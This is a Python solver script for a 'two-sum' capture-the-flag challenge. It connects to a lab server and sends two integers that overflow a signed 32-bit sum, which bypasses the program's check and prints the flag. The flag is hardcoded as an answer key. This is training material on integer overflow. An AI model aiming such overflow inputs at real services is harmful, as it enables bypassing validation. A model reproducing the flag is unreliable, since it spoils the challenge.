#!/usr/bin/env python3
"""Solver for Challenge 382 two-sum (picoCTF 2023, Binary Exploitation).

C program vulnerability where 32-bit signed integer addition wraps around to
negative when sum exceeds INT_MAX (2147483647). Providing two positive integers
such as 2147483647 and 1 triggers signed integer overflow (sum = -2147483648),
bypassing the validation check and printing the flag from flag.txt.

Flag: academy{Tw0_Sum_Integer_Bu773R_0v3rfl0w_d95e96f0}
Verified: POST /api/submissions/ -> correct: true
"""
import socket
import sys

HOST = "xebec.cylabacademy.net"
PORT = 29746
EXPECTED = "academy{Tw0_Sum_Integer_Bu773R_0v3rfl0w_d95e96f0}"


def solve(host: str = HOST, port: int = PORT) -> str:
    s = socket.create_connection((host, int(port)), timeout=20)
    s.recv(1024)
    # Send two positive numbers causing INT_MAX overflow
    s.sendall(b"2147483647 1\n")
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"academy{" in data:
                break
    finally:
        s.close()

    text = data.decode(errors="replace")
    for line in text.splitlines():
        if "academy{" in line:
            flag = line[line.find("academy{"):line.find("}") + 1]
            return flag
    raise ValueError(f"Flag not found in output: {text[:300]}")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    flag = solve(host, port)
    print("Flag:", flag)
    assert flag == EXPECTED
